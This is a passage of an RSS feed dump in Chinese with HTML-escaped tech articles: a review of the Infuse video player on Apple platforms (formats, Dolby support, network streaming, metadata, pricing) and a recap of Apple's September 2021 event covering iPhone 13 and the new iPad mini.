个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/361938709?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在入手ps4还是等到明年ps5发售？</a><br><a href=\"http://www.zhihu.com/question/381977573?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高考之后想玩主机游戏，但那时候PS5还没出，考虑到PS4可能被PS5顶，但又非常想玩怎么办？跪求大佬？</a><br>\n","link":"http://www.zhihu.com/question/485084293/answer/2122276060?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"也许是 Apple 平台最全能的视频播放 App：Infuse","date":"2021-09-15 07:02:57","description":"\n<p>当我们讨论 Apple 平台的视频播放器时，Infuse 一定是 Big Players 中的一员。Infuse 不仅支持了 Apple 全家桶中能够播放视频的全部设备，还几乎支持所有常用格式的视频文件。同时，Infuse 还是一款剧集管理工具，能够自动下载元数据，还能保持影视资源库的整洁有序。</p>\n<h2>实力过硬</h2>\n<p>Infuse 的第一个版本发布于 2013 年，一开始只支持 iOS 设备。2015 年，Infuse 4.0 正式支持了 Apple TV，而今年 5 月份发布的 Infuse 7 提供了 macOS 版本。至此，Infuse 已经覆盖 iPhone、iPod touch、iPad、Apple TV、Mac 等全系产品，成为了名副其实的 Apple 全家桶应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/4b718c6fc71f0878f14e25b64f4606aa\"><figcaption>来源：https://firecore.com/infuse</figcaption></figure><p>基础过硬是 Infuse 的第一大特点。作为一款视频播放器，能够支持广泛的视频格式和解码器至关重要。至今，Infuse 已经支持了几乎全部常用的视频、音频、字幕格式，而其中支持的部分小众格式我相信大多数人基本不会遇到。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>视频格式</strong></td>\n<td><strong>音频格式</strong></td>\n<td><strong>字幕格式</strong></td>\n</tr>\n<tr>\n<td>3GP</td>\n<td>AAC</td>\n<td>DVB</td>\n</tr>\n<tr>\n<td>AVI</td>\n<td>AC3</td>\n<td>DVDSUB</td>\n</tr>\n<tr>\n<td>ASF</td>\n<td>E-AC3</td>\n<td>MICRODVD</td>\n</tr>\n<tr>\n<td>BDMV</td>\n<td>DTS</td>\n<td>MPL2</td>\n</tr>\n<tr>\n<td>DIVX</td>\n<td>DTS-HD</td>\n<td>PGS</td>\n</tr>\n<tr>\n<td>DVD</td>\n<td>FLAC</td>\n<td>SMI</td>\n</tr>\n<tr>\n<td>MEDIA</td>\n<td>MP3</td>\n<td>SSA/ASS</td>\n</tr>\n<tr>\n<td>DVR-MS</td>\n<td>OGG</td>\n<td>SRT</td>\n</tr>\n<tr>\n<td>FLV</td>\n<td>DOLBY</td>\n<td>SUB</td>\n</tr>\n<tr>\n<td>ISO/IMG</td>\n<td>WMA</td>\n<td>TIMED TEXT</td>\n</tr>\n<tr>\n<td>M2TS</td>\n<td> </td>\n<td>TMP</td>\n</tr>\n<tr>\n<td>M4V</td>\n<td> </td>\n<td>TXT</td>\n</tr>\n<tr>\n<td>MKV</td>\n<td> </td>\n<td>VOBSUB</td>\n</tr>\n<tr>\n<td>MOV</td>\n<td> </td>\n<td>VTT</td>\n</tr>\n<tr>\n<td>MP4</td>\n<td> </td>\n<td>XSUB</td>\n</tr>\n<tr>\n<td>MPEG</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>MTS</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>MXF</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>OGM</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>OGV</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>TS</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>VIDEO_TS</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>WEBM</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>WM</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>VWTV</td>\n<td> </td>\n<td> </td>\n</tr>\n</tbody></table></figure><p>特别值得一提的是 Infuse 对杜比音频解码的支持。早在 2014 年 10 月发布的 Infuse 3 中，就已经实现了对 DTS® 以及 DTS-HD® 音频播放。这比 2016 年 3 月，Apple 在 iOS 9.3 版本中正式原声支持杜比音频早了近 2 年时间。所以 Infuse 也是当时为数不多、甚至是唯一支持杜比音频解码的 iOS 视频播放器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/51bf26034448f6d17c397ec24da29cbc\"><figcaption>来源：https://www.dolby.com/technologies/dolby-atmos/</figcaption></figure><p>而后续在 Infuse 6 中，又加入了对 Dolby® Digital Plus（AC3/E-AC3）的支持，这也就是我们经常所说的杜比全景声（Dolby Atmos）。当然，如今支持 Dolby Atmos 早已不仅只有 Infuse，得益于 Apple 原生支持了 Dolby Atmos，类似于 <a href=\"https://apps.apple.com/cn/app/nplayer/id1116905928\" target=\"_blank\">nPlayer</a>、<a href=\"https://apps.apple.com/cn/app/vlc-for-mobile/id650377962\" target=\"_blank\">VLC</a> 等视频播放器也已经跟进了该特性。Apple Music 也在今年 5 月份宣布支持 Dolby Atmos 串流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/2f2c04ee0828282e23b4db24a5c7bcb1.png\"><figcaption>Infuse 里程碑</figcaption></figure><p>除了杜比音频，另一项值得一提的就是杜比视界（Dolby Vision）了。2017 年 9 月，iPhone X 是第一款在其 Super Retina OLED 屏幕上引入对杜比视界 HDR 支持的 iOS 设备。同年 11 月，Infuse 5.6 也正式支持了 HDR 视频回放。杜比视界因其出色的亮度、对比度和色彩深得影视迷们的喜爱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/a45a9b0271d9415b8408de4d7923c231\"><figcaption>杜比视界 HDR 和 SDR 视频画面对比</figcaption></figure><p>目前，Infuse 7 <strong>同时支持</strong>了 DV Profile 8.1 和 Profile 5 的 4K 单层（Single Layer）杜比视界视频回放。相较其他几款常见的视频播放器，<a href=\"https://apps.apple.com/cn/app/nplayer/id1116905928\" target=\"_blank\">nPlayer</a> 不支持 Profile 5 的 4K 杜比视界视频回放，<a href=\"https://apps.apple.com/cn/app/vlc-for-mobile/id650377962\" target=\"_blank\">VLC</a> 则完全不支持 HDR 视频回放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/eddb33f0b492f79f24172d307a889f07\"><figcaption>Infuse 支持 HDR 4K 视频回放</figcaption></figure><p>总体来讲，如果你想要在 iOS 设备上回放 4K HDR 视频，Infuse 无疑是最佳选择。而如果你想要通过 Apple TV 连接 OLED 电视回放 HDR 视频，<strong>Infuse 则几乎成为了唯一选择</strong>。</p>\n<h2>无缝串流</h2>\n<p>使用第三方应用播放视频最直接的方式当然是将视频拷贝到应用中，但这并不是使用 Infuse 最推荐的方式。为了更方便地观看高清视频，你可以通过各种方式进行串流播放。</p>\n<p>目前，Infuse 支持的网络协议非常丰富，包括 SMB、NFS、FTP、SFTP、UPnP、DLNA 和 WebDAV 等。通过这些协议，你可以浏览、下载和播放视频。以较为常用的 SMB 协议为例，你可以通过电脑下载视频后，基于该协议直接在移动设备上播放视频。首先，我们需要检查电脑是否启用了 SMB 文件共享，<a href=\"https://support.apple.com/zh-cn/guide/mac-help/mh17131/mac\" target=\"_blank\">Mac</a> 和 <a href=\"https://pureinfotech.com/setup-network-file-sharing-windows-10/\" target=\"_blank\">Windows</a> 电脑开启的方式各有不同。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/c00b19200ad1ffa272b9db67b52c8897\"><figcaption>Mac 打开 SMB 文件共享</figcaption></figure><p>当文件共享被启用后，我们就可以在 iPhone、iPad 或者 Apple TV 上打开 Infuse，通过 SMB 协议连接到电脑。连接的步骤如下：</p>\n<ol>\n<li>点击设置（齿轮）图标，并选择「新增文件来源」。</li>\n<li>一旦进入「新增文件来源」菜单，任何检测到的设备将被列在「可用的共享」底部。</li>\n<li>连接并输入用户名和密码，默认为电脑的用户名和登录密码。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/6ff7d09ecd931c1c937641446b41e900\"><figcaption>Infuse 添加 SMB 局域网设备</figcaption></figure><p>在这个过程中，如果「可用的共享」没有检测到设备，你可以通过点击其他手动设置连接。参考上方图三，其中：</p>\n<ul>\n<li>名称：Infuse 中显示的共享名称，自定义。</li>\n<li>地址：局域网设备的 IP 地址。</li>\n<li>用户名/密码：设备登录的用户名和密码。值得注意的是，如果连接到 Time Capsule 或 Airport Extreme，用户名需要设置为 admin。</li>\n</ul>\n<p>其他网络协议的设置方式大同小异，这里就不再赘述了。除了基于现有的网络协议，Infuse 还支持直接连接到常用的云盘服务，例如：Dropbox、Google Drive、OneDrive、Box、MEGA 等。当然，大部分云盘都是国外的产品，国内云盘基本都不支持。</p>\n<p>虽然 Infuse 没有原生集成国内的云盘，但我们还是可以连接到坚果云等开放了 WebDAV 协议的云盘。以坚果云为例，在设置页面开启 WebDAV，并在 Infuse 中创建连接即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/09525c5455ef3b8c4b76659b041935ab\"><figcaption>Infuse 添加 WebDAV 协议坚果云 </figcaption></figure><p>而对于近期因不限速而热度上升的阿里云盘，网络上也提供了 <a href=\"https://github.com/zxbu/webdav-aliyundriver\" target=\"_blank\">开启 WebDAV 的方法</a> 可供参考。除了上述两类串流方式，Infuse 还原生集成了 Plex、Emby、Jellyfin 等流媒体托管平台。你可以通过 Infuse 直接访问上述平台的视频库，还支持同步观看历史和播放进度等常用的功能。由于提到的这几个流媒体托管平台国内用户并不常用，这里就不再赘述了。</p>\n<h2>剧集管家</h2>\n<p>Infuse 的硬实力是强大的解码能力和丰富的串流协议，但 Infuse 的潜力远不止于此。包括我在内的众多喜欢 Infuse 的用户其实更偏爱于 Infuse 强大的剧集管理能力。当你通过云盘、电脑、NAS 等储存设备来整理自己钟爱的剧集时，都只是孤立的视频文件。而 Infuse 则可以赋予这些视频文件详细的元数据（Metadata）。</p>\n<p>我们通过网易云音乐等流媒体应用听歌的时候，你会发现一首歌包含有封面、歌手、作词、作曲、歌词等信息，这些都是音频的元数据。电影和剧集也一样，完整的元数据包含有封面、演职人员信息、上映日期、单集介绍等一系列详细的信息，而这些信息往往并不会直接内嵌在视频文件中。</p>\n<p>最为知名的是 <a href=\"https://www.themoviedb.org/\" target=\"_blank\">TMDb</a> ，这是一个由社区维护的电影、电视节目、演员和剧组的在线数据库，其收集了近 70 万部电影、12 万部剧集、200 多万演职人员信息和近 300 万张图片。Infuse 通过接入 TMDb 数据库，能够自动匹配视频文件包含的元数据并以精美的样式展示出来。</p>\n<p>当然，为了方便 Infuse 能够自动匹配数据，其对视频文件的命名规则有一定要求。例如剧集通常需要命名为类似 <code>show-name_s01e02.mkv</code> 样式，包含有剧集名称，相应的季和集数。当然 Infuse 最大程度地兼容了常见流媒体平台购买下载剧集之后的默认名称规则，所以一般情况下无需手动修改视频文件名称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/80b5b79997211d79165e041e5d006c70\"><figcaption>Infuse 自动下载剧集元数据并展示</figcaption></figure><p>与此同时，Infuse 还能够对剧集和电影按照常见的类别进行自动归类，例如分为：动作、喜剧、剧情、纪录片等。还能通过自动获取评分信息，对影片进行排名。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/c01bc734311892aaed7d212c0aaa2e7c\"><figcaption>Infuse 主界面提供的自动归类展示</figcaption></figure><p>当然，你也可以创建自己的播放列表，根据偏好对视频进行分组管理，并使用过滤器进行浏览。而这一切都可以基于 iCloud 完成多设备同步，保证整个 Infuse 播放列表、观看历史和评级在你的任何一台设备上都完全一致。这种体验是极其舒服的，例如你先在客厅的电视上看剧，回卧室后还可以躺着在手机上继续看后续的内容，无需任何额外的手动操作。</p>\n<p>除了通过 iCloud 同步 Infuse 的设置和状态，很多剧迷们会使用 <a href=\"https://trakt.tv/\" target=\"_blank\">Trakt</a> 来管理自己的观影记录。Trakt 是一个可以用来跟踪电视节目和电影的平台，与大部分类似用于记录剧集观看记录的服务不同，Trakt 能够与常见流媒体服务和播放器进行集成，一切都是自动完成的。而 Trakt 提供的数据面板可以汇总你的影视观看记录以及个人追剧日历。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/7b2eed2771043569843c1053729cd0fc\"><figcaption>Trakt 剧集进度自动追踪</figcaption></figure><p>Infuse 同样集成了 <a href=\"https://trakt.tv/\" target=\"_blank\">Trakt</a> 服务，在购买 Pro 版本后，Infuse 支持与 Trakt 之间的双向同步，包括：实时的观看历史和播放位置，以及剧集的评分和评论。</p>\n<h2>电视伴侣</h2>\n<p>虽然移动设备的普及让大多数观剧过程都放到了手机或者平板上，但电视依旧是家庭中绝佳的大屏观影设备。如果你正好购买了一台 Apple TV 和 OLED 电视，那么 Infuse 一定是你在电视上观影的不二之选。</p>\n<p>Infuse 是在 2015 年 9 月第四代 Apple TV 发布后正式提供了 tvOS 版本的应用。第四代 Apple TV 开始允许用户下载第三方应用，并增加了 Dolby Digital Plus 音频的支持。而今年发布的 Apple TV 4K 已经正式支持了 Dolby Vision 和 Dolby Atmos，Infuse 也在第一时间完成了适配工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/8cde5cc440ca1ad4731cfba6789fb257\"><figcaption>Apple TV 4K 版本 Infuse 主界面</figcaption></figure><p>从整体的设计上，tvOS 版本的 Infuse 和其他平台的应用并无太大不同，除了界面布局针对电视显示做了一些调整之外，功能和菜单选项等都几乎一致。</p>\n<p>这里值得一提的是新的 HomePod 家庭影院选项。如今，HomePod 已经支持搭配 Apple TV 4K 在家中营造出具有杜比全景声或环绕声音效的影院级体验。通过设置将 HomePod 用作电视扬声器后，Infuse 能直接通过 HomePod 播放 Dolby Atmos 音频，并支持多达 7.1 通道的 24 位 48KHz 音频串流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/14c400925d30e2bd02905fa31e40e31c\"><figcaption>通过 HomePod 播放 Dolby Atmos 音频</figcaption></figure><p>除此之外，考虑到在电视上展示出更精美的效果，tvOS 版本的 Infuse 支持针对资源库设置自定义封面，这是其他平台版本尚未支持的特性。</p>\n<h2>总结</h2>\n<p>Infuse 是我最常用的视频播放应用，在撰写这篇文章的过程中，我也挑选并体验了 Apple 平台上的其他几款知名视频播放器应用，包括 <a href=\"https://apps.apple.com/cn/app/nplayer/id1116905928\" target=\"_blank\">nPlayer</a>、<a href=\"https://apps.apple.com/cn/app/vlc-for-mobile/id650377962\" target=\"_blank\">VLC for mobile</a>、<a href=\"https://apps.apple.com/cn/app/kmplayer/id835776444\" target=\"_blank\">KMPlayer</a> 等。其中，我觉得 nPlayer 和 VLC 我觉得还是值得拿出来和 Infuse 对比一下。</p>\n<p>喜欢 nPlayer 的用户也非常多，在支持的视频格式、解码能力、串流协议等方面和 Infuse 相差不大。其最大的优势在于 30 元的买断价格，而劣势在于暂未提供 tvOS 版本同时不支持 Profile 5 的 4K 杜比视界视频回放。此外，官方上次更新时间停留在 2020 年 11 月（2021 年 9 月记录），时隔近一年时间了，不仅让我对这款应用的后续状况产生担忧。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>对比</strong></td>\n<td><strong>Infuse 7</strong></td>\n<td><strong>nPlayer</strong></td>\n<td><strong>VLC</strong></td>\n</tr>\n<tr>\n<td>设计</td>\n<td>★ ★ ★ ★ ★</td>\n<td>★ ★ ★</td>\n<td>★ ★ ★</td>\n</tr>\n<tr>\n<td>解码能力</td>\n<td>4K HDR</td>\n<td>4K HDR</td>\n<td>4K SDR</td>\n</tr>\n<tr>\n<td>杜比全景声</td>\n<td>🟢</td>\n<td>🟢</td>\n<td>🟢</td>\n</tr>\n<tr>\n<td>杜比视界</td>\n<td>🟢</td>\n<td>⛔️</td>\n<td>🔴</td>\n</tr>\n<tr>\n<td>元数据</td>\n<td>★ ★ ★ ★ ★</td>\n<td>★</td>\n<td>★</td>\n</tr>\n<tr>\n<td>价格</td>\n<td>68 元／每年</td>\n<td>30 元／买断</td>\n<td>完全免费</td>\n</tr>\n<tr>\n<td>平台</td>\n<td><code>iOS／iPadOS／tvOS／macOS</code></td>\n<td><code>iOS／iPadOS</code></td>\n<td><code>iOS／iPadOS／tvOS／macOS</code></td>\n</tr>\n</tbody></table></figure><p>而 VLC 的优势在于其完全开源免费，同时支持 Apple 全平台设备。当然其不支持杜比视界视频回放也是硬伤，但这对于大部分普通用户而言无伤大雅。VLC 作为一款免费应用，做到目前这种程度已经非常良心了。当然，无论是 nPlayer 还是 VLC，它们大多都还仅仅是单纯的视频播放应用。Infuse 提供的剧集及元数据管理特性，以及整体的精美程度都有着很大的优势。</p>\n<p>最后让我们来说一说 Infuse 的定价。目前 Infuse 在 App Store 国区定价采用了订阅和买断兼顾的策略，分别是 7 元/月，68 元/年，488 元/终身。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/ff040942fb47ad700f3048ff85a6f59f\"><figcaption>Infuse 7 价格及高级特性</figcaption></figure><p>对于这几个档次，我的建议是根据自己使用 Infuse 频率来定，如果你是一个剧迷，拥有 Apple 全家桶，且每天或者每周都会使用到 Infuse，那毫不犹豫考虑按年订阅。订阅付费能够当你在每次大版本升级时都不需要支付额外的费用，考虑到 Infuse 的更新频率且订阅 1 次即可解锁全平台设备，这个价格还是相当良心了。最后，如果你对 Infuse 感兴趣，欢迎到 <a href=\"https://apps.apple.com/cn/app/infuse-7/id1136220934\" target=\"_blank\">App Store</a> 和 <a href=\"https://apps.apple.com/cn/app/infuse-7/id1136220934\" target=\"_blank\">Mac App Store</a> 免费下载体验。</p>\n<span class=\"ss-application\" app-id=\"16043\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68706"},{"title":"一图流｜一张图带你看完 Apple 2021 年秋季新品发布会","date":"2021-09-14 22:44:19","description":"\n<p>今天凌晨，Apple 通过在线直播的形式召开了 2021 年秋季新品发布会。Apple 在本届发布会上推出了 iPhone 13 及 13 Pro 系列手机、新款 iPad mini、新款 iPad、Apple Watch Series 7 等产品。如果你没有熬夜看发布会，不用担心，少数派不仅整理了发布会的详细回顾文章，还连夜赶制了发布会要点的一图流，让你用最简单直观的方式迅速了解本届 Apple 新品发布会的完整动态。</p>\n<p>👉 <a href=\"https://sspai.com/post/68811\" target=\"_blank\">Apple 2021 秋季新品发布会完整回顾文章</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/70d30a084222dff6c9c746a10d514631.jpeg\"></figure><p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68812"},{"title":"你想要的高刷屏 iPhone、全面屏 iPad mini 都来了：Apple 发布会回顾","date":"2021-09-14 21:11:33","description":"\n<p>今天凌晨，Apple 正式举行发布会，发布 iPhone 13 系列、Apple Watch Series 7、iPad mini 等多款新品。其中，iPhone 13 Pro 系列正式支持 ProMotion 高刷新率屏幕，推出远峰蓝新配色；iPad mini 更换 USB-C 接口，采用全面屏设计，支持二代 Apple Pencil 等。</p>\n<p>如果你没有熬夜看发布会，少数派为你整理了发布会要点，还连夜赶制了发布会要点的信息图，让你用最简单直观的方式迅速了解新款设备。 </p>\n<p>👉 <a href=\"https://sspai.com/post/68812\" target=\"_blank\">一图流 | 一张图带你看完 iPhone 13 发布会</a></p>\n<h2>iPhone 13 系列：更小的「刘海」，更好的相机</h2>\n<p>今年的 iPhone 13 系列依旧分为 iPhone 13 和 iPhone 13 mini 2 款机型，除了外观、配色方面的变化，芯片、摄像头、电池续航等也都有不同程度的升级。</p>\n<p>外观方面，iPhone 13 系列的设计与前代无较大差异，后置双摄像头改为对角线式的对称设计，前置原深感摄像头的「刘海」区域面积降低 20%，提供经过全新设计的 5 种配色，分别是粉色、蓝色、午夜色、星光色、红色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6sdb34tdhj3i1e60.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPhone 13</figcaption></figure><p>iPhone 13 系列依然搭载的是采用超瓷晶面板的超视网膜 XDR 显示屏，屏幕尺寸分别为 5.4 和 6.1 英寸，支持 IP68 防溅、抗水、防尘等级。显示效果方面，iPhone 13 系列支持 800 尼特最大亮度，1200 尼特 HDR 峰值最大亮度，屏幕对比度达到 2000000:1。</p>\n<p>相机方面，iPhone 13 系列配备了 1200 万像素广角和超广角后置镜头，广角镜头新增了传感器位移式光学图像防抖功能，能够在拍摄时提供更好的防抖效果；进光量增加 47%。</p>\n<p>视频拍摄方面，iPhone 13 系列推出了全新的电影效果模式，能够在拍摄时智能自动地切换画面焦点，设备还将能够预判即将入镜的画面主体，实现更加即使的焦点切换效果。这项功能也支持在拍摄完成之后，由用户手动更改和调整不同画面中的焦点和虚化效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6slb34tdhtodstr0.gif\"><figcaption>「电影效果」支持自动智能切换焦点</figcaption></figure><p>拍照方面，最新的智能 HDR 4 功能能够在一个场景中识别最多 4 位人物，并根据不同人物的肤色、位置光线等条件，针对性地调整各自的显示效果。在中地光场景中，智能 HDR 4 还会启用深度融合技术，分析多次曝光画面中的各个像素，让照片保留更多画面细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/ddd25c91482d3b07cacc2d0e830a7794.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>智能 HDR 4 官方样张</figcaption></figure><p>iPhone 13 系列还推出了一项名为「摄影风格」的新功能，「摄影风格」提供了「标准」「高对比度」「高饱和度」「冷色调」「暖色调」5 种风格预设，除了「标准」风格，其余风格预设均支持手动调整色调和色温。设置好摄影风格之后，相机会智能地将相应色调和色温的设置应用到照片局部，同时保持人物肤色等的自然表现。「摄影风格」中提供的预设只需要设定一次，之后采用该风格拍摄的照片都会自动应用之前设置好的参数。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6ttb34tdhtodstrg.gif\"><figcaption>摄影风格</figcaption></figure><p>前置原深感摄像头方面，除了面积降低 20%，也配备了与后置摄像头一致的电影效果、摄影风格、智能 HDR 4、夜间模式等功能。</p>\n<p>续航方面，据官网提供的测试信息显示，iPhone 13 mini 相较前代产品续航时长增加了 1.5 小时，iPhone 13 的续航时长相较前代产品增加了 2.5 小时。</p>\n<p>iPhone 13 系列在存储容量上也较前代产品有所提升，提供 128GB、256GB、512GB 可选。售价方面，iPhone 13 mini 的售价分别为 ¥5,199 (128GB)、¥5,999 (256GB)、¥7,599 (512GB)；iPhone 13 的售价分别为 ¥5,999 (128GB)、¥6,799 (256GB)、¥8,399 (512GB)。iPhone 13 和 iPhone 13 mini 将于 9 月 17 日本周五晚 8 点开启预购，9 月 24 日下周五正式发售。</p>\n<h2>iPhone 13 Pro 系列：ProMotion 高刷屏，还有专业级摄影功能</h2>\n<p>与 iPhone 13 系列一样，iPhone 13 Pro 系列拥有更小的原深感摄像头「刘海」区域，配备超瓷晶面板，支持 IP68 级防溅、抗水、防尘。配色方面，iPhone 13 Pro 系列提供了远峰蓝色、银色、金色和石墨色 4 种配色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6udb34tdhn8pbntg.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPhone 13 Pro</figcaption></figure><p>屏幕方面，ProMotion 自适应刷新率首次来到了 iPhone 上。iPhone 13 Pro 系列上的 ProMotion 自适应刷新率功能支持在 10Hz 至最高 120Hz 之间进行智能调整。比如，当浏览屏幕内容静止不动时，屏幕会自动切换至低刷新率运行，当滑动屏幕查看内容或者玩游戏时，屏幕又会动态调整至高刷新率运行，最高可达 120Hz。亮度方面，iPhone 13 Pro 系列支持 1000 尼特最大亮度，1200 尼特 HDR 峰值最大亮度，屏幕对比度达到 2000000:1。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6ulb34tdhj3i1e6g.gif\"><figcaption>ProMotion 显示屏</figcaption></figure><p>性能方面，iPhone 13 Pro 系列搭载的 A15 仿生芯片拥有 6 核 CPU 中央处理器 (2 颗性能核心 + 4 颗能效核心)、5 核 GPU 图形处理器 (iPhone 13 系列为 4 核 GPU)，新的 16 核神经网络引擎可以用于驱动电影效果、智能 HDR 4 等功能。</p>\n<p>相机方面，在具有与 iPhone 13 系列一致的电影效果 (广角、长焦、原深感镜头)、摄影风格、智能 HDR 4 等功能的基础上，iPhone 13 Pro 系列还有多项升级。首先是微距模式，经过重新设计的超广角镜头支持对焦拍摄距离最近为 2 厘米的物品，这项功能同样可以用于视频拍摄、慢动作和延时摄影拍摄中。</p>\n<p>iPhone 13 Pro 系列采用了 ƒ/1.5 光圈的广角镜头，光线捕捉能力提升了 2.2 倍，支持传感器位移式光学防抖功能；超广角镜头方面，ƒ/1.8 光圈的镜头光线捕捉能力提升了 92%；77 毫米的长焦镜头不仅支持 3 倍光学变焦，也终于加入了夜间模式。</p>\n<p>视频拍摄方面，iPhone 13 Pro 系列推出了 ProRes 视频格式，让视频具有更高的色彩保真度和低压缩度，ProRes 格式视频也能导入至 macOS 上的 Final Cut Pro 应用，进行更加专业的剪辑处理。ProRes 视频格式将于今年晚些时候正式推出，前置原深感镜头将同样支持这项功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6utb34tdhtodsts0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>ProRes</figcaption></figure><p>续航方面，据官网提供的测试信息显示，iPhone 13 Pro 相较前代产品续航时长增加了 1.5 小时，iPhone 13 Pro Max 的续航时长相较前代产品增加了 2.5 小时。存储容量方面，除了与 iPhone 13 系列一致的 128GB、256GB、512GB 选项，iPhone 13 Pro 系列还提供了最高达 1TB 的存储容量选项。</p>\n<p>价格方面，iPhone 13 Pro 的价格分别为：</p>\n<ul>\n<li>¥7,999 (128GB)</li>\n<li>¥8,799 (256GB)</li>\n<li>¥10,399 (512GB)</li>\n<li>¥11,999 (1TB)</li>\n</ul>\n<p>iPhone 13 Pro Max 的售价分别为：</p>\n<ul>\n<li>¥8,999 (128GB)</li>\n<li>¥9,799 (256GB)</li>\n<li>¥11,399 (512GB)</li>\n<li>¥12,999 (1TB)</li>\n</ul>\n<p>iPhone 13 Pro 和 iPhone 13 Pro Max 将于 9 月 17 日本周五晚 8 点开启预购，9 月 24 日下周五正式发售。</p>\n<h2>iPad mini：更好的全面显示屏、A15 芯片……该有的都有了</h2>\n<p>新款 iPad mini 升级了类似 iPad Pro 的全面屏外观设计，屏幕尺寸为 8.3 英寸，上一代为 7.9 英寸，接口改为了 USB-C 接口，传输速度为 5Gbps，无线方面支持 Wi-Fi 6 技术和 5G 网络。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6vdb34tdhopdm70g.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>支持 USB-C 接口</figcaption></figure><p>新款 iPad mini 屏幕采用了 Liquid 视网膜屏幕，支持原彩显示、P3 广色域，最高亮度为 500 尼特，且配备了横向立体声扬声器。配色方面，除去深空灰以外，本次 iPad mini 新增了粉色、紫色和星光色三种全新的配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6vlb34tdhj3i1e70.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPad mini</figcaption></figure><p>新款 iPad mini 同样配备了 A15 仿生芯片，比上一代性能提升高达 80%。但继续采用的是 Touch ID 技术，传感器和 iPad Air 4 一样与电源按键进行了集成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6vtb34tdhtodstsg.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>电源键集成 Touch ID</figcaption></figure><p>新款 iPad mini 利用全新的 1200 万超大广角前置摄像头实现了和 iPad Pro 一致的人像居中功能，这项功能会自动调整摄像头并跟随用户移动，使用户始终位于画面中央，当有新用户加入时则会逐渐放大取景区域，让所有人都出现在画面中。</p>\n<figure class=\"image ss-img-wrapper 